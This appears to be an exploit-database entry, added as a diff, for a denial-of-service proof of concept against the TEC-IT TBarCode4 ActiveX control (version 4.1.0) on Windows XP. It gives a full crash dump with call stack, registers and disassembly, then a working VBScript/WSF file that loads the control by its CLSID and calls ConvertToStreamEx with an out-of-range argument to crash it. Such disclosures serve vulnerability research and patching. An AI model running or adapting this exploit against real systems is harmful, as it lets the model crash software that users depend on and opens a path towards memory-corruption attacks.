@@ -1,0 +1,140 @@
+# Exploit Title: TEC-IT TBarCode OCX ActiveX Control (TBarCode4.ocx 4.1.0 ) dos poc
+# Date: 29.7.2013
+# Exploit Author: d3b4g
+# Vendor Homepage:http://www.tec-it.com/en/start/Default.aspx
+# Software Link: http://www.tec-it.com/en/start/Default.aspx
+# Tested on: Windows XP SP3
+
+
+
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 7785DFE4	CMP BYTE PTR [EAX+7],5	(ntdll.dll)
+
+Seh Chain:
+--------------------------------------------------
+1 	3C5744 	TBarCode4.OCX
+2 	5AFCD959 	VBSCRIPT.dll
+3 	778A71D5 	ntdll.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+ntdll.7785DFE4                KERNEL32.765614DD             
+KERNEL32.765614DD             TBarCode4.3C0D31              
+TBarCode4.3C0D31              TBarCode4.39205E              
+TBarCode4.39205E              OLEAUT32.76B83E75             
+OLEAUT32.76B83E75             OLEAUT32.76B83CEF             
+OLEAUT32.76B83CEF             OLEAUT32.76B8052F             
+OLEAUT32.76B8052F             TBarCode4.3BC65B              
+TBarCode4.3BC65B              VBSCRIPT.5AF927E5             
+VBSCRIPT.5AF927E5             VBSCRIPT.5AF93737             
+VBSCRIPT.5AF93737             VBSCRIPT.5AF951AE             
+VBSCRIPT.5AF951AE             VBSCRIPT.5AF950CA             
+VBSCRIPT.5AF950CA             VBSCRIPT.5AF955A5             
+VBSCRIPT.5AF955A5             VBSCRIPT.5AF95951             
+VBSCRIPT.5AF95951             VBSCRIPT.5AF9417A             
+VBSCRIPT.5AF9417A             SCROBJ.5ABD831F               
+SCROBJ.5ABD831F               SCROBJ.5ABD99D3               
+SCROBJ.5ABD99D3               SCROBJ.5ABD986E               
+SCROBJ.5ABD986E               SCROBJ.5ABD980B               
+SCROBJ.5ABD980B               SCROBJ.5ABD97D0               
+SCROBJ.5ABD97D0               E140CD                        
+E140CD                        E06B44                        
+E06B44                        E033B4                        
+E033B4                        E03189                        
+E03189                        E030FA                        
+E030FA                        E02F93                        
+E02F93                        KERNEL32.765633AA             
+KERNEL32.765633AA             ntdll.77869EF2                
+ntdll.77869EF2                ntdll.77869EC5                
+
+
+Registers:
+--------------------------------------------------
+EIP 7785DFE4
+EAX 00000178
+EBX 00000180
+ECX 0038EB34 -> 0038F9B4
+EDX 0045685A -> 00030000
+EDI 00000000
+ESI 005B0000 -> F9F249C7
+EBP 0038E0D4 -> 0038E0E8
+ESP 0038E0C4 -> 00000180
+
+
+Block Disassembly: 
+--------------------------------------------------
+7785DFC8	JNZ 77863481
+7785DFCE	TEST BYTE PTR [ESI+48],1
+7785DFD2	JNZ 778642B3
+7785DFD8	TEST BL,7
+7785DFDB	JNZ 778ADFE9
+7785DFE1	LEA EAX,[EBX-8]
+7785DFE4	CMP BYTE PTR [EAX+7],5	  <--- CRASH
+7785DFE8	JE 778ADFD2
+7785DFEE	TEST BYTE PTR [EAX+7],3F
+7785DFF2	JE 778ADFE0
+7785DFF8	MOV [EBP-4],EAX
+7785DFFB	CMP EAX,EDI
+7785DFFD	JE 778AE053
+7785E003	CMP BYTE PTR [EBX-1],5
+7785E007	JE 778ADFFC
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	005B0000 -> F9F249C7
+EBP+12	00000000
+EBP+16	00000180
+EBP+20	0038E130 -> 0038E4F4
+EBP+24	003C0D31 -> 64F04D8B
+EBP+28	005B0000 -> F9F249C7
+
+
+Stack Dump:
+--------------------------------------------------
+38E0C4 80 01 00 00 C0 E3 38 00 00 00 00 00 00 00 00 00  [................]
+38E0D4 E8 E0 38 00 DD 14 56 76 00 00 5B 00 00 00 00 00  [......Vv..[.....]
+38E0E4 80 01 00 00 30 E1 38 00 31 0D 3C 00 00 00 5B 00  [..............[.]
+38E0F4 00 00 00 00 80 01 00 00 C0 E3 38 00 B8 E3 38 00  [................]
+38E104 00 00 00 00 00 00 00 00 4A 3C 86 77 33 00 00 00  [........J..w....]
+
+
+
+
++-- Poc
+
+
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:2FD4F344-D857-4853-BC2F-88D5863BDB57' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Users\Administrator\Desktop\TBarCode4.ocx"
+prototype  = "Function ConvertToStreamEx ( ByVal hDC As Long ,  ByVal eImageType As tag_ImageType ,  ByVal nQuality As Long ,  ByVal nXSize As Long ,  ByVal nYSize As Long ,  ByVal nXRes As Long ,  ByVal nYRes As Long )"
+memberName = "ConvertToStreamEx"
+progid     = "TBARCODE4Lib.TBarCode4"
+argCount   = 7
+
+arg1=1
+arg2=1
+arg3=1
+arg4=1
+arg5=1
+arg6=1
+arg7=-2147483647
+
+target.ConvertToStreamEx arg1 ,arg2 ,arg3 ,arg4 ,arg5 ,arg6 ,arg7 
+
+</script></job></package>
+
+
+
+
+-end
+
+
+
+
+
